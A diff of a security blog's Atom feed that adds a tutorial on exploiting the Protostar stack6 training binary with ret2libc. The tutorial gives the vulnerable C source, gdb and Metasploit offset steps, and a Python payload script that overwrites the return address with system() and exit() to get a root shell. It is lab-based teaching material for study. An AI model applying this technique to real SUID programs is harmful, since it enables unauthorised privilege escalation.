@@ -1,4 +1,160 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.7.4">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2019-03-19T15:37:57+02:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">0xRick Owned Root !</title><subtitle>Infosec Blog , CTF and Hack The Box write-ups , articles and other stuff</subtitle><entry><title type="html">Hack The Box - Carrier</title><link href="http://localhost:4000/hack-the-box/carrier/" rel="alternate" type="text/html" title="Hack The Box - Carrier" /><published>2019-03-16T00:00:00+02:00</published><updated>2019-03-16T00:00:00+02:00</updated><id>http://localhost:4000/hack-the-box/carrier</id><content type="html" xml:base="http://localhost:4000/hack-the-box/carrier/">&lt;hr /&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.7.4">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2019-03-20T23:37:11+02:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">0xRick Owned Root !</title><subtitle>Infosec Blog , CTF and Hack The Box write-ups , articles and other stuff</subtitle><entry><title type="html">Buffer Overflow Practical Examples , ret2libc - protostar stack6</title><link href="http://localhost:4000/binary-exploitation/bof6/" rel="alternate" type="text/html" title="Buffer Overflow Practical Examples , ret2libc - protostar stack6" /><published>2019-03-20T00:00:00+02:00</published><updated>2019-03-20T00:00:00+02:00</updated><id>http://localhost:4000/binary-exploitation/bof6</id><content type="html" xml:base="http://localhost:4000/binary-exploitation/bof6/">&lt;hr /&gt;
+
+&lt;h3 id=&quot;introduction&quot;&gt;Introduction&lt;/h3&gt;
+&lt;h4 id=&quot;hey-guys--in-the-last-post-about-buffer-overflow-we-exploited-a-buffer-overflow-vulnerability-where-we-were-able-to-inject-a-shellcode-and-escalate-privileges-to-root-but-that-was-possible-because-we-were-able-to-overwrite-the-return-address-to-another-address-on-the-stack-where-we-placed-our-shellcode--but-what-if-the-stack-is-non-executable--we-will-perform-an-attack-called-ret2libc-and-thats-what-we-are-going-to-discuss-today-with-protostar---stack6-without-wasting-more-time-lets-jump-right-in-&quot;&gt;Hey guys , In the last post about buffer overflow we exploited a buffer overflow vulnerability where we were able to inject a shellcode and escalate privileges to root. But that was possible because we were able to overwrite the return address to another address on the stack where we placed our shellcode , but what if the stack is non-executable ? we will perform an attack called ret2libc and that’s what we are going to discuss today with protostar - stack6. Without wasting more time let’s jump right in !&lt;/h4&gt;
+&lt;h4 id=&quot;read-the-previous-posts-if-you-havent-yet&quot;&gt;Read the &lt;a href=&quot;/categories/#binary-exploitation&quot;&gt;previous posts&lt;/a&gt; if you haven’t yet.&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/binary-exploitation/BOF6/0.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;hr /&gt;
+
+&lt;h3 id=&quot;stack6&quot;&gt;./stack6&lt;/h3&gt;
+&lt;h4 id=&quot;as-always-we-are-given-the-source-code-of-the-binary-&quot;&gt;As always we are given the source code of the binary :&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#include &amp;lt;stdlib.h&amp;gt;
+#include &amp;lt;unistd.h&amp;gt;
+#include &amp;lt;stdio.h&amp;gt;
+#include &amp;lt;string.h&amp;gt;
+
+void getpath()
+{
+        char buffer[64];
+        unsigned int ret;
+
+        printf(&quot;input path please: &quot;); fflush(stdout);
+
+        gets(buffer);
+
+        ret = __builtin_return_address(0);
+
+        if((ret &amp;amp; 0xbf000000) == 0xbf000000) {
+                printf(&quot;bzzzt (%p)\n&quot;, ret);
+                _exit(1);
+        }
+
+        printf(&quot;got path %s\n&quot;, buffer);
+}
+
+int main(int argc, char **argv)
+{
+        getpath();
+
+
+
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h4 id=&quot;what-this-code-is-doing-is-just-printing-input-path-please-then-it-stores-our-input-in-a-buffer-of-64-chars-and-finally-it-prints-it-out&quot;&gt;What this code is doing is just printing &lt;code class=&quot;highlighter-rouge&quot;&gt;input path please:&lt;/code&gt; then it stores our input in a buffer of 64 chars and finally it prints it out:&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/binary-exploitation/BOF6/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;our-problem-is-this-if-statement-&quot;&gt;Our problem is this &lt;code class=&quot;highlighter-rouge&quot;&gt;if&lt;/code&gt; statement :&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;        if((ret &amp;amp; 0xbf000000) == 0xbf000000) {
+                printf(&quot;bzzzt (%p)\n&quot;, ret);
+                _exit(1);
+        }
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h4 id=&quot;this-is-making-sure-that-the-return-address-is-not-on-the-stack--which-makes-it-not-possible-to-perform-a-shellcode-injection-like-we-did-in-the-previous-example-we-can-defeat-this-by-a-technique-called-ret2libc&quot;&gt;This is making sure that the return address is not on the stack , which makes it not possible to perform a shellcode injection like we did in the &lt;a href=&quot;/binary-exploitation/bof5/&quot;&gt;previous example&lt;/a&gt;. We can defeat this by a technique called ret2libc.&lt;/h4&gt;
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+&lt;hr /&gt;
+
+&lt;h3 id=&quot;ret2libc&quot;&gt;ret2libc&lt;/h3&gt;
+&lt;h4 id=&quot;so-what-is-ret2libc--if-we-take-the-word-itself--ret-is-return--2-means-to-and-libc-is-the-c-library-the-idea-behind-ret2libc-is-instead-of-injecting-shellcode-and-jumping-to-the-address-that-holds-that-shellcode-we-can-use-the-functions-that-are-already-in-the-c-library-for-example-we-can-call-the-function-system-and-make-it-execute-binsh-read-about-system-here-we-will-also-need-to-use-the-function-exit-to-make-the-program-exit-cleanly-read-about-exit-here&quot;&gt;So what is “ret2libc” ? If we take the word itself : “ret” is return , “2” means to and “libc” is the C library. The idea behind ret2libc is instead of injecting shellcode and jumping to the address that holds that shellcode we can use the functions that are already in the C library. For example we can call the function &lt;code class=&quot;highlighter-rouge&quot;&gt;system()&lt;/code&gt; and make it execute &lt;code class=&quot;highlighter-rouge&quot;&gt;/bin/sh&lt;/code&gt;. (Read about &lt;code class=&quot;highlighter-rouge&quot;&gt;system()&lt;/code&gt; &lt;a href=&quot;https://www.tutorialspoint.com/c_standard_library/c_function_system.htm&quot;&gt;here&lt;/a&gt;). We will also need to use the function &lt;code class=&quot;highlighter-rouge&quot;&gt;exit()&lt;/code&gt; to make the program exit cleanly. (Read about &lt;code class=&quot;highlighter-rouge&quot;&gt;exit()&lt;/code&gt; &lt;a href=&quot;https://www.tutorialspoint.com/c_standard_library/c_function_exit.htm&quot;&gt;here&lt;/a&gt;).&lt;/h4&gt;
+&lt;h4 id=&quot;so-finally-our-attack-payload-will-be--padding--address-of-system--address-of-exit--binsh-instead-of--padding--new-return-address--nop--shellcode&quot;&gt;So finally our attack payload will be : “padding –&amp;gt; address of &lt;code class=&quot;highlighter-rouge&quot;&gt;system()&lt;/code&gt; –&amp;gt; address of &lt;code class=&quot;highlighter-rouge&quot;&gt;exit()&lt;/code&gt; –&amp;gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;/bin/sh&lt;/code&gt;” instead of : “padding –&amp;gt; new return address –&amp;gt; NOP –&amp;gt; shellcode”.&lt;/h4&gt;
+&lt;h4 id=&quot;now-lets-see-how-will-we-do-it&quot;&gt;Now let’s see how will we do it.&lt;/h4&gt;
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+&lt;hr /&gt;
+
+&lt;h3 id=&quot;exploiation&quot;&gt;Exploiation&lt;/h3&gt;
+&lt;h4 id=&quot;again--this-will-execute-binsh-as-root-because-this-binary-is-an-suid-binary-if-it-wasnt-suid-we-would-get-a-shell-as-the-same-user-we-can-check-by-using-find-&quot;&gt;Again , this will execute &lt;code class=&quot;highlighter-rouge&quot;&gt;/bin/sh&lt;/code&gt; as root because this binary is an &lt;code class=&quot;highlighter-rouge&quot;&gt;suid&lt;/code&gt; binary. If it wasn’t &lt;code class=&quot;highlighter-rouge&quot;&gt;suid&lt;/code&gt; we would get a shell as the same user. We can check by using &lt;code class=&quot;highlighter-rouge&quot;&gt;find&lt;/code&gt; :&lt;/h4&gt;
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;find /opt/protostar/bin/ -perm -4000 | grep stack6&lt;/code&gt;
+&lt;img src=&quot;/images/binary-exploitation/BOF6/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;as-you-can-see-stack6-is-an-suid-binary&quot;&gt;As you can see &lt;code class=&quot;highlighter-rouge&quot;&gt;stack6&lt;/code&gt; is an &lt;code class=&quot;highlighter-rouge&quot;&gt;suid&lt;/code&gt; binary.&lt;/h4&gt;
+&lt;h4 id=&quot;so-first-of-all--after-we-call-system-we-will-need-to-give-it-binsh--how-will-we-do-that--a-nice-way-to-do-it-is-to-store-binsh-in-an-environment-variable-i-created-a-variable-and-called-it-shell-&quot;&gt;So first of all , after we call &lt;code class=&quot;highlighter-rouge&quot;&gt;system()&lt;/code&gt; we will need to give it &lt;code class=&quot;highlighter-rouge&quot;&gt;/bin/sh&lt;/code&gt; , how will we do that ? A nice way to do it is to store &lt;code class=&quot;highlighter-rouge&quot;&gt;/bin/sh&lt;/code&gt; in an environment variable. I created a variable and called it &lt;code class=&quot;highlighter-rouge&quot;&gt;SHELL&lt;/code&gt; :&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/binary-exploitation/BOF6/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;now-we-need-to-find-the-address-of-that-variable--we-can-do-it-from-gdb-by-setting-a-breakpoint-at-main--then-running-the-program-and-doing-this--xs-char-environx-where-x-is-a-number--this-will-print-the-address-of-an-environment-variable-we-will-keep-trying-numbers-until-we-get-the-address-of-shell&quot;&gt;Now we need to find the address of that variable , we can do it from &lt;code class=&quot;highlighter-rouge&quot;&gt;gdb&lt;/code&gt; by setting a breakpoint at main , then running the program and doing this : &lt;code class=&quot;highlighter-rouge&quot;&gt;x/s *((char **)environ+x)&lt;/code&gt; where &lt;code class=&quot;highlighter-rouge&quot;&gt;x&lt;/code&gt; is a number , This will print the address of an environment variable. We will keep trying numbers until we get the address of &lt;code class=&quot;highlighter-rouge&quot;&gt;SHELL&lt;/code&gt;&lt;/h4&gt;
+&lt;h4 id=&quot;but-i-found-a-better-way-to-do-it-when-i-was-reading-an-article-on-shellblade-we-will-use-a-c-program-to-tell-us-the-estimated-address&quot;&gt;But I found a better way to do it when I was reading an article on &lt;a href=&quot;https://www.shellblade.net/&quot;&gt;shellblade&lt;/a&gt;. We will use a &lt;code class=&quot;highlighter-rouge&quot;&gt;c&lt;/code&gt; program to tell us the estimated address.&lt;/h4&gt;
+&lt;h4 id=&quot;code-&quot;&gt;Code :&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#include &amp;lt;stdio.h&amp;gt;
+#include &amp;lt;stdlib.h&amp;gt;
+#include &amp;lt;unistd.h&amp;gt;
+int main(int argc, char **argv)
+{
+        char *ptr = getenv(&quot;SHELL&quot;);
+        if (ptr != NULL)
+        {
+                printf(&quot;Estimated address: %p\n&quot;, ptr);
+                return 0;
+        }
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;img src=&quot;/images/binary-exploitation/BOF6/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;then-we-will-compile-it--gcc-addressc--o-address-&quot;&gt;Then we will compile it : &lt;code class=&quot;highlighter-rouge&quot;&gt;gcc address.c -o address&lt;/code&gt; :&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/binary-exploitation/BOF6/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;as-you-can-see-its-telling-us-the-address-of-the-environment-variable-shell-now-keep-in-mind-that-this-is-not-the-exact-address-and-we-will-need-to-go-up-and-down-to-get-the-right-address&quot;&gt;As you can see it’s telling us the address of the environment variable &lt;code class=&quot;highlighter-rouge&quot;&gt;SHELL&lt;/code&gt;. Now keep in mind that this is not the “exact” address and we will need to go up and down to get the right address.&lt;/h4&gt;
+&lt;h4 id=&quot;lets-start-by-finding-the-offset-as-we-did-before-we-will-use-pattern_createrb-and-pattern_offsetrb-from-metasploit-exploitation-tools&quot;&gt;Let’s start by finding the offset. As we did before we will use &lt;code class=&quot;highlighter-rouge&quot;&gt;pattern_create.rb&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;pattern_offset.rb&lt;/code&gt; from metasploit exploitation tools.&lt;/h4&gt;
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;./pattern_create.rb -l 100&lt;/code&gt;
+&lt;img src=&quot;/images/binary-exploitation/BOF6/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;we-have-our-pattern-now-lets-run-the-program-in-gdb-and-set-a-breakpoint-before-main-break-main-then-we-will-type-c-to-continue-and-paste-the-pattern-the-buffer-will-overflow-and-we-will-see-exactly-where-did-the-overflow-happen-&quot;&gt;We have our pattern now let’s run the program in gdb and set a breakpoint before main &lt;code class=&quot;highlighter-rouge&quot;&gt;break *main&lt;/code&gt;. Then we will type &lt;code class=&quot;highlighter-rouge&quot;&gt;c&lt;/code&gt; to continue and paste the pattern. The buffer will overflow and we will see exactly where did the overflow happen :&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/binary-exploitation/BOF6/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;we-got-the-address-0x37634136--now-lets-go-back-and-use-pattern_offsetrb-&quot;&gt;We got the address &lt;code class=&quot;highlighter-rouge&quot;&gt;0x37634136&lt;/code&gt; , now let’s go back and use &lt;code class=&quot;highlighter-rouge&quot;&gt;pattern_offset.rb&lt;/code&gt; :&lt;/h4&gt;
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;./pattern_offset.rb -q 0x37634136&lt;/code&gt;
+&lt;img src=&quot;/images/binary-exploitation/BOF6/8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;so-after-80-chars-the-buffer-overflows-next-thing-to-check-is-the-addresses-of-system-and-exit-from-gdb-we-will-set-a-break-point-at-main-and-type-r-to-run-the-program-after-it-reaches-the-break-point-and-breaks-we-can-get-the-address-of-system-by-typing-p-system-and-we-will-do-the-same-thing-for-exit-p-exit-&quot;&gt;So after 80 chars the buffer overflows. Next thing to check is the addresses of &lt;code class=&quot;highlighter-rouge&quot;&gt;system()&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;exit()&lt;/code&gt;. From gdb we will set a break point at main and type &lt;code class=&quot;highlighter-rouge&quot;&gt;r&lt;/code&gt; to run the program. After it reaches the break point and breaks we can get the address of system by typing &lt;code class=&quot;highlighter-rouge&quot;&gt;p system&lt;/code&gt; and we will do the same thing for exit &lt;code class=&quot;highlighter-rouge&quot;&gt;p exit&lt;/code&gt; :&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/binary-exploitation/BOF6/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;address-of-system--0xb7ecffb0&quot;&gt;Address of system : &lt;code class=&quot;highlighter-rouge&quot;&gt;0xb7ecffb0&lt;/code&gt;&lt;/h4&gt;
+&lt;h4 id=&quot;address-of-exit--0xb7ec60c0&quot;&gt;Address of exit : &lt;code class=&quot;highlighter-rouge&quot;&gt;0xb7ec60c0&lt;/code&gt;&lt;/h4&gt;
+&lt;h4 id=&quot;lastly-we-will-check-the-address-of-shell-again-because-its-subject-to-change-&quot;&gt;Lastly we will check the address of &lt;code class=&quot;highlighter-rouge&quot;&gt;SHELL&lt;/code&gt; again because it’s subject to change :&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/binary-exploitation/BOF6/10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;address--0xbffff985&quot;&gt;Address : &lt;code class=&quot;highlighter-rouge&quot;&gt;0xbffff985&lt;/code&gt;&lt;/h4&gt;
+&lt;h4 id=&quot;lets-check-our-notes-&quot;&gt;Let’s check our notes :&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/binary-exploitation/BOF6/11.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;ok--we-are-ready-to-write-our-exploit--we-will-use-struct-import-struct-like-we-did-before-we-will-create-a-variable-for-the-chars-we-will-use-to-fill-the-buffer-and-call-it-buffer--its-value-will-be-80-as&quot;&gt;Ok , we are ready to write our exploit , we will use struct &lt;code class=&quot;highlighter-rouge&quot;&gt;import struct&lt;/code&gt; like we did before. We will create a variable for the chars we will use to fill the buffer and call it &lt;code class=&quot;highlighter-rouge&quot;&gt;buffer&lt;/code&gt; , its value will be 80 A’s.&lt;/h4&gt;
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;buffer = &quot;A&quot; * 80&lt;/code&gt;&lt;/p&gt;
+&lt;h4 id=&quot;then-we-will-create-3-variables-to-hold-the-addresses-of-system--exit-and-shell-we-will-use-struct-to-reverse-the-addresses&quot;&gt;Then we will create 3 variables to hold the addresses of &lt;code class=&quot;highlighter-rouge&quot;&gt;system()&lt;/code&gt; , &lt;code class=&quot;highlighter-rouge&quot;&gt;exit()&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;SHELL&lt;/code&gt;. We will use struct to reverse the addresses.&lt;/h4&gt;
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;system = struct.pack(&quot;I&quot; ,0xb7ecffb0)&lt;/code&gt;
+&lt;br /&gt;
+&lt;br /&gt;
+&lt;code class=&quot;highlighter-rouge&quot;&gt;exit = struct.pack(&quot;I&quot; ,0xb7ec60c0)&lt;/code&gt;
+&lt;br /&gt;
+&lt;br /&gt;
+&lt;code class=&quot;highlighter-rouge&quot;&gt;shell = struct.pack(&quot;I&quot; ,0xbffff985)&lt;/code&gt;&lt;/p&gt;
+&lt;h4 id=&quot;and-finally-we-will-print-the-payload&quot;&gt;And finally we will print the payload.&lt;/h4&gt;
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;print buffer + system + exit + shell&lt;/code&gt;&lt;/p&gt;
+&lt;h4 id=&quot;final-script-&quot;&gt;Final script :&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;import struct
+
+buffer = &quot;A&quot; * 80
+system = struct.pack(&quot;I&quot; ,0xb7ecffb0)
+exit = struct.pack(&quot;I&quot; ,0xb7ec60c0)
+shell = struct.pack(&quot;I&quot; ,0xbffff985)
+
+print buffer + system + exit + shell
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;img src=&quot;/images/binary-exploitation/BOF6/12.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;we-have-to-remember-that-the-address-of-shell-is-not-the-exact-address-and-we-will-need-to-go-up-or-down-for-a-little-bit-we-will-execute-the-script-and-redirect-the-output-to-a-file-and-name-it-payload-python-tmpstack6py--tmppayload--then-we-will-cat-the-file-and-pipe-the-output-to-stack6-&quot;&gt;We have to remember that the address of &lt;code class=&quot;highlighter-rouge&quot;&gt;SHELL&lt;/code&gt; is not the exact address and we will need to go up or down for a little bit. We will execute the script and redirect the output to a file and name it payload. &lt;code class=&quot;highlighter-rouge&quot;&gt;python /tmp/stack6.py &amp;gt; /tmp/payload&lt;/code&gt; , Then we will cat the file and pipe the output to &lt;code class=&quot;highlighter-rouge&quot;&gt;./stack6&lt;/code&gt; :&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/binary-exploitation/BOF6/13.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;and-no-shell--after-going-up-and-down-by-editing-the-address-in-the-python-script-i-finally-got-the-right-address-which-is-0xbffff992-&quot;&gt;And no shell , After going up and down by editing the address in the python script I finally got the right address which is &lt;code class=&quot;highlighter-rouge&quot;&gt;0xbffff992&lt;/code&gt; :&lt;/h4&gt;
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;python /tmp/stack6.py &amp;gt; /tmp/payload&lt;/code&gt;
+&lt;br /&gt;
+&lt;br /&gt;
+&lt;code class=&quot;highlighter-rouge&quot;&gt;cat /tmp/payload - | ./stack6&lt;/code&gt;
+&lt;img src=&quot;/images/binary-exploitation/BOF6/14.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;root-shell&quot;&gt;root shell!&lt;/h4&gt;
+&lt;h4 id=&quot;so-after-editing-the-address-of-shell-variable--the-script-will-be-like-this-&quot;&gt;So after editing the address of &lt;code class=&quot;highlighter-rouge&quot;&gt;shell&lt;/code&gt; variable , the script will be like this :&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;import struct
+
+buffer = &quot;A&quot; * 80
+system = struct.pack(&quot;I&quot; ,0xb7ecffb0)
+exit = struct.pack(&quot;I&quot; ,0xb7ec60c0)
+shell = struct.pack(&quot;I&quot; ,0xbffff992)
+
+print buffer + system + exit + shell
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;img src=&quot;/images/binary-exploitation/BOF6/15.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;thats-it--feedback-is-appreciated-&quot;&gt;That’s it , Feedback is appreciated !&lt;/h4&gt;
+&lt;h4 id=&quot;dont-forget-to-read-the-previous-articles--tweet-about-the-article-if-you-liked-it--follow-on-twitter-for-awesome-resources-ahm3d_h3sham&quot;&gt;Don’t forget to read the &lt;a href=&quot;/categories&quot;&gt;previous articles&lt;/a&gt; , Tweet about the article if you liked it , follow on twitter for awesome resources &lt;a href=&quot;https://twitter.com/Ahm3d_H3sham&quot;&gt;@Ahm3d_H3sham&lt;/a&gt;&lt;/h4&gt;
+&lt;h4 id=&quot;thanks-for-reading&quot;&gt;Thanks for reading.&lt;/h4&gt;
+&lt;p&gt;&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;previous-buffer-overflow-article--buffer-overflow-practical-examples--shellcode-injection-and-local-privilege-escalation---protostar-stack5&quot;&gt;Previous Buffer Overflow article : &lt;a href=&quot;/binary-exploitation/bof5/&quot;&gt;Buffer Overflow Practical Examples , Shellcode Injection and Local Privilege Escalation - protostar stack5&lt;/a&gt;&lt;/h4&gt;
+&lt;hr /&gt;</content><author><name></name></author><summary type="html">Introduction Hey guys , In the last post about buffer overflow we exploited a buffer overflow vulnerability where we were able to inject a shellcode and escalate privileges to root. But that was possible because we were able to overwrite the return address to another address on the stack where we placed our shellcode , but what if the stack is non-executable ? we will perform an attack called ret2libc and that’s what we are going to discuss today with protostar - stack6. Without wasting more time let’s jump right in ! Read the previous posts if you haven’t yet. ./stack6 As always we are given the source code of the binary : #include &amp;lt;stdlib.h&amp;gt; #include &amp;lt;unistd.h&amp;gt; #include &amp;lt;stdio.h&amp;gt; #include &amp;lt;string.h&amp;gt; void getpath() { char buffer[64]; unsigned int ret; printf(&quot;input path please: &quot;); fflush(stdout); gets(buffer); ret = __builtin_return_address(0); if((ret &amp;amp; 0xbf000000) == 0xbf000000) { printf(&quot;bzzzt (%p)\n&quot;, ret); _exit(1); } printf(&quot;got path %s\n&quot;, buffer); } int main(int argc, char **argv) { getpath(); } What this code is doing is just printing input path please: then it stores our input in a buffer of 64 chars and finally it prints it out: Our problem is this if statement : if((ret &amp;amp; 0xbf000000) == 0xbf000000) { printf(&quot;bzzzt (%p)\n&quot;, ret); _exit(1); } This is making sure that the return address is not on the stack , which makes it not possible to perform a shellcode injection like we did in the previous example. We can defeat this by a technique called ret2libc. ret2libc So what is “ret2libc” ? If we take the word itself : “ret” is return , “2” means to and “libc” is the C library. The idea behind ret2libc is instead of injecting shellcode and jumping to the address that holds that shellcode we can use the functions that are already in the C library. For example we can call the function system() and make it execute /bin/sh. (Read about system() here). We will also need to use the function exit() to make the program exit cleanly. (Read about exit() here). So finally our attack payload will be : “padding –&amp;gt; address of system() –&amp;gt; address of exit() –&amp;gt; /bin/sh” instead of : “padding –&amp;gt; new return address –&amp;gt; NOP –&amp;gt; shellcode”. Now let’s see how will we do it. Exploiation Again , this will execute /bin/sh as root because this binary is an suid binary. If it wasn’t suid we would get a shell as the same user. We can check by using find : find /opt/protostar/bin/ -perm -4000 | grep stack6 As you can see stack6 is an suid binary. So first of all , after we call system() we will need to give it /bin/sh , how will we do that ? A nice way to do it is to store /bin/sh in an environment variable. I created a variable and called it SHELL : Now we need to find the address of that variable , we can do it from gdb by setting a breakpoint at main , then running the program and doing this : x/s *((char **)environ+x) where x is a number , This will print the address of an environment variable. We will keep trying numbers until we get the address of SHELL But I found a better way to do it when I was reading an article on shellblade. We will use a c program to tell us the estimated address. Code : #include &amp;lt;stdio.h&amp;gt; #include &amp;lt;stdlib.h&amp;gt; #include &amp;lt;unistd.h&amp;gt; int main(int argc, char **argv) { char *ptr = getenv(&quot;SHELL&quot;); if (ptr != NULL) { printf(&quot;Estimated address: %p\n&quot;, ptr); return 0; } } Then we will compile it : gcc address.c -o address : As you can see it’s telling us the address of the environment variable SHELL. Now keep in mind that this is not the “exact” address and we will need to go up and down to get the right address. Let’s start by finding the offset. As we did before we will use pattern_create.rb and pattern_offset.rb from metasploit exploitation tools. ./pattern_create.rb -l 100 We have our pattern now let’s run the program in gdb and set a breakpoint before main break *main. Then we will type c to continue and paste the pattern. The buffer will overflow and we will see exactly where did the overflow happen : We got the address 0x37634136 , now let’s go back and use pattern_offset.rb : ./pattern_offset.rb -q 0x37634136 So after 80 chars the buffer overflows. Next thing to check is the addresses of system() and exit(). From gdb we will set a break point at main and type r to run the program. After it reaches the break point and breaks we can get the address of system by typing p system and we will do the same thing for exit p exit : Address of system : 0xb7ecffb0 Address of exit : 0xb7ec60c0 Lastly we will check the address of SHELL again because it’s subject to change : Address : 0xbffff985 Let’s check our notes : Ok , we are ready to write our exploit , we will use struct import struct like we did before. We will create a variable for the chars we will use to fill the buffer and call it buffer , its value will be 80 A’s. buffer = &quot;A&quot; * 80 Then we will create 3 variables to hold the addresses of system() , exit() and SHELL. We will use struct to reverse the addresses. system = struct.pack(&quot;I&quot; ,0xb7ecffb0) exit = struct.pack(&quot;I&quot; ,0xb7ec60c0) shell = struct.pack(&quot;I&quot; ,0xbffff985) And finally we will print the payload. print buffer + system + exit + shell Final script : import struct buffer = &quot;A&quot; * 80 system = struct.pack(&quot;I&quot; ,0xb7ecffb0) exit = struct.pack(&quot;I&quot; ,0xb7ec60c0) shell = struct.pack(&quot;I&quot; ,0xbffff985) print buffer + system + exit + shell We have to remember that the address of SHELL is not the exact address and we will need to go up or down for a little bit. We will execute the script and redirect the output to a file and name it payload. python /tmp/stack6.py &amp;gt; /tmp/payload , Then we will cat the file and pipe the output to ./stack6 : And no shell , After going up and down by editing the address in the python script I finally got the right address which is 0xbffff992 : python /tmp/stack6.py &amp;gt; /tmp/payload cat /tmp/payload - | ./stack6 root shell! So after editing the address of shell variable , the script will be like this : import struct buffer = &quot;A&quot; * 80 system = struct.pack(&quot;I&quot; ,0xb7ecffb0) exit = struct.pack(&quot;I&quot; ,0xb7ec60c0) shell = struct.pack(&quot;I&quot; ,0xbffff992) print buffer + system + exit + shell That’s it , Feedback is appreciated ! Don’t forget to read the previous articles , Tweet about the article if you liked it , follow on twitter for awesome resources @Ahm3d_H3sham Thanks for reading. Previous Buffer Overflow article : Buffer Overflow Practical Examples , Shellcode Injection and Local Privilege Escalation - protostar stack5</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/binary-exploitation/BOF6/0.png" /></entry><entry><title type="html">Hack The Box - Carrier</title><link href="http://localhost:4000/hack-the-box/carrier/" rel="alternate" type="text/html" title="Hack The Box - Carrier" /><published>2019-03-16T00:00:00+02:00</published><updated>2019-03-16T00:00:00+02:00</updated><id>http://localhost:4000/hack-the-box/carrier</id><content type="html" xml:base="http://localhost:4000/hack-the-box/carrier/">&lt;hr /&gt;
 
 &lt;h3 id=&quot;quick-summary&quot;&gt;Quick Summary&lt;/h3&gt;
